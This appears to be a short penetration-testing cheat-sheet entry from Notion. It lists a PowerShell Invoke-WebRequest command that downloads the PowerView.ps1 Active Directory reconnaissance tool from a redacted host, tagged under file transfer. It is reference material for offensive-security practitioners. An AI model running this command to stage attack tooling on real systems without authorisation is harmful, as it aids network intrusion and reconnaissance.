# Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1

OS: Windows
Description: Powershell Download File
Security Domains: File Transfer (https://www.notion.so/File-Transfer-1444c8e52376809ba2ecfc98dc62c772?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)